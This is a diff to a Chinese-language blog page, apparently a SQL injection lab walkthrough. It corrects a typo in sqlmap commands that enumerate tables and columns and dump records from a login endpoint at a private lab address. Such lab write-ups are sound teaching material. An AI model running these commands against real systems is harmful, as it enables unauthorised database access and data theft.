@@ -273,7 +273,7 @@ SELECT * FROM users WHERE name = &#39;$input&#39; 正常情况下 $input 是一�
 </span></span></code></pre></div><p>探测 tables。</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo sqlmap -u <span style="color:#e6db74">&#34;http://10.10.10.15/login&#34;</span> -D Enils --tables --level <span style="color:#ae81ff">3</span> --batch
 </span></span></code></pre></div><p>探测 volumns。</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo sqlmap -u <span style="color:#e6db74">&#34;http://10.10.10.15/login&#34;</span> -D Enils -T Malus --volumns --level <span style="color:#ae81ff">3</span> --batch
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo sqlmap -u <span style="color:#e6db74">&#34;http://10.10.10.15/login&#34;</span> -D Enils -T Malus --columns --level <span style="color:#ae81ff">3</span> --batch
 </span></span></code></pre></div><p>爆破数据。</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo sqlmap -u <span style="color:#e6db74">&#34;http://10.10.10.15/login&#34;</span> -D Enils -T Malus -V marcbark --dump --level <span style="color:#ae81ff">3</span> --batch
 </span></span></code></pre></div><ul>
